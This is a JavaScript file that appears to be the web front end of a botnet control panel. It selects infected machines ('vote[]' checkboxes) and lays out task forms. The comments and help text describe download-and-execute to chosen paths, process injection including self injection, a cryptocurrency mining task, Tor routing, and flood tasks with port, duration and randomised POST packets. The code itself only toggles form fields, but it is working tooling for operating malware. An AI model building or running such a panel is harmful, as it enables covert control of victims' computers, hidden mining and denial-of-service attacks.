function checkAll()
{
	var boxes = document.getElementsByTagName("input");
	for (var i = 0; i < boxes.length; i++) {
		if (boxes[i].name == "vote[]") {
			boxes[i].checked = true;
		}
	}
}
function uncheckAll()
{
	var boxes = document.getElementsByTagName("input");
	for (var i = 0; i < boxes.length; i++) {
		if (boxes[i].name == "vote[]") {
			boxes[i].checked = false;
		}
	}
}
function checkValueUpper(contain) 
{
    var boxes = document.getElementsByTagName("input");
    for (var i = 0; i < boxes.length; i++) {
        if (boxes[i].name == "vote[]") {
            if (boxes[i].value.indexOf(contain[0].value) != -1) {
                boxes[i].checked = true;
                     
			}
		}
	}
}
function checkValue(contain) 
{
    var boxes = document.getElementsByTagName("input");
    for (var i = 0; i < boxes.length; i++) {
        if (boxes[i].name == "vote[]") {
			if (boxes[i].value.toLowerCase().indexOf(contain[0].value) != -1) {
                 boxes[i].checked = true;
			}
		}
	}
}
function checkValueSplit(contain,index) 
{
    // this shit needs to be done right   
    var contents = contain[0].value;
    var boxes = document.getElementsByTagName("input");
    for (var i = 0; i < boxes.length; i++) {
        if (boxes[i].name == "vote[]") {
            var splited = boxes[i].value.split(":");
			if( contain[0].value.indexOf('|') >= 0){
				// Found world
				//alert('Found');
				var splitted_uno = contain[0].value.split("|");
				//alert(splited[index].toLowerCase());
				//alert(splitted_uno[1]);
				if( splited[index].toLowerCase().indexOf(splitted_uno[0]) >= 0){
					//alert('Should check');
					boxes[i].checked = true;
				}else if(splited[index].toLowerCase().indexOf(splitted_uno[1]) >= 0){
					//alert('Should check');
					boxes[i].checked = true;
				}
			}else{
				//alert('Not Found');
				//alert(contain[0].value);
				if( splited[index].toLowerCase().indexOf(contain[0].value) >= 0){
					boxes[i].checked = true;
				}
			}
        }
	}
}
function checkAmount(number) {       
    var boxes = document.getElementsByName("vote[]");  
    var len = (number>boxes.length)? boxes.length: number;
    for (var i = 0; i < len; i++) {  
         boxes[i].checked = true;  
    }  
}


function changeLayoutMisc(value)
{
	ChangeUrlToIp(value);
	ShowTor(value);
	ShowUpdate(value);
	
	if(value == '0' || value == '22' )// Nothing
	{
		
		document.getElementById('misc_url').style.display = 'none';
		document.getElementById('misc_command').style.display = 'none';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'none';
		document.getElementById('misc_duration').style.display = 'none';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
	else if( value == '3' || value == '5' || value == '9' || value == '18' || value == '19' || value == '20') //url
	{
		document.getElementById('misc_url').style.display = 'block';
		document.getElementById('misc_command').style.display = 'none';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'none';
		document.getElementById('misc_duration').style.display = 'none';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
	else if(value == '10') //url & md5
	{
		document.getElementById('misc_url').style.display = 'block';
		document.getElementById('misc_command').style.display = 'none';
		document.getElementById('misc_md5').style.display = 'block';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'none';
		document.getElementById('misc_duration').style.display = 'none';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
	else if(value == '4' || value == '7') //url & args
	{
		document.getElementById('misc_url').style.display = 'block';
		document.getElementById('misc_command').style.display = 'none';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'block';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'none';
		document.getElementById('misc_duration').style.display = 'none';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
	else if( value == '1' || value == '2') //url & file location
	{
		document.getElementById('misc_url').style.display = 'block';
		document.getElementById('misc_command').style.display = 'none';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'block';
		document.getElementById('misc_port').style.display = 'none';
		document.getElementById('misc_duration').style.display = 'none';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
	else if(value == 'futuresmartview...') //url & open & close
	{
		document.getElementById('misc_url').style.display = 'block';
		document.getElementById('misc_command').style.display = 'none';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'none';
		document.getElementById('misc_duration').style.display = 'none';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
	else if(value == '21') // command
	{
		document.getElementById('misc_url').style.display = 'none';
		document.getElementById('misc_command').style.display = 'block';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'none';
		document.getElementById('misc_duration').style.display = 'none';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
	else if(value == '8') // url & duration 
	{
		document.getElementById('misc_url').style.display = 'block';
		document.getElementById('misc_command').style.display = 'none';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'none';
		document.getElementById('misc_duration').style.display = 'block';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
	else if(value == '12' || value == '13') // url & packet & duration & port
	{
		document.getElementById('misc_url').style.display = 'block';
		document.getElementById('misc_command').style.display = 'none';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'block';
		document.getElementById('misc_duration').style.display = 'block';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'block';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
	else if(value == '14' || value == '15' || value == '16' || value == '17' || value == '23') // url & duration & port
	{
		document.getElementById('misc_url').style.display = 'block';
		document.getElementById('misc_command').style.display = 'none';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'block';
		document.getElementById('misc_duration').style.display = 'block';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
	
	else if(value == '11') // Mining task
	{
		document.getElementById('misc_url').style.display = 'none';
		document.getElementById('misc_command').style.display = 'block';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'none';
		document.getElementById('misc_duration').style.display = 'block';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'block';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
	else if(value == '6') //inject to specific
	{
		document.getElementById('misc_url').style.display = 'block';
		document.getElementById('misc_command').style.display = 'none';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'none';
		document.getElementById('misc_duration').style.display = 'none';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'block';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
	else if(value == '24') //group
	{
		document.getElementById('misc_url').style.display = 'none';
		document.getElementById('misc_command').style.display = 'none';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'none';
		document.getElementById('misc_duration').style.display = 'none';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'block';
		document.getElementById('misc_taskname').style.display = 'none';
	}
	
	else if(value == '25') // url & duration & port
	{
		document.getElementById('misc_url').style.display = 'block';
		document.getElementById('misc_command').style.display = 'none';
		document.getElementById('misc_md5').style.display = 'none';
		document.getElementById('misc_args').style.display = 'none';
		document.getElementById('misc_fileloc').style.display = 'none';
		document.getElementById('misc_port').style.display = 'block';
		document.getElementById('misc_duration').style.display = 'none';
		document.getElementById('misc_data').style.display = 'none';
		document.getElementById('misc_procname').style.display = 'none';
		document.getElementById('misc_packet').style.display = 'none';
		//document.getElementById('misc_engine').style.display = 'none';
		document.getElementById('misc_group').style.display = 'none';
		document.getElementById('misc_taskname').style.display = 'block';
	}
}

function ChangeUrlToIp(value)
{
	if( value == '25')
	{
		document.getElementById('lbl_url').innerHTML = "IP";
		document.getElementById('misc_port_value').value = "8090";
		
		//8090
	}
	else
	{
		document.getElementById('lbl_url').innerHTML = "URL";
		document.getElementById('misc_port_value').value = "";
	}
}

function ShowTor(value)
{
	if(value == '1' || value == '2' || value == '3' || value == '4' || value == '5' || value == '6' || value == '7' || value == '9' || value == '10')
	{
		document.getElementById('misc_tor').style.display = 'block';
	}
	else
	{
		document.getElementById('misc_tor').style.display = 'none';
	}
}

function ShowUpdate(value)
{
	if(value == '9' || value == '10')
	{
		document.getElementById('misc_on_the_fly').style.display = 'block';
	}
	else
	{
		document.getElementById('misc_on_the_fly').style.display = 'none';
	}
}

function changeLayoutHelp(value)  // Change Help block informations
{
	//alert(value);
	if( value == '1' || value == '2')
	{
		document.getElementById('help').innerHTML = "Note: If you leave the Save Path parameter empty it will use random path to save file. Use wildcard '%' instead of drive letter! Example usage --> '%:\\Users\\User\\Desktop\\mydownload.exe'";
	}
	else if( value == '6')
	{
		document.getElementById('help').innerHTML = "Note: If you leave the Process Name parameter empty it will use self injection! .NET Framework dependant executables can not be injected into native processes!";
	}
	else if( value == '11')
	{
		document.getElementById('help').innerHTML = "";
	}
	else if( value == '12' || value == '13')
	{
		document.getElementById('help').innerHTML = "Note: Packet example 'username=%&password=%' ('%' variable will be replaced with random data).";
	}
	else
	{
		document.getElementById('help').innerHTML = "";
	}

}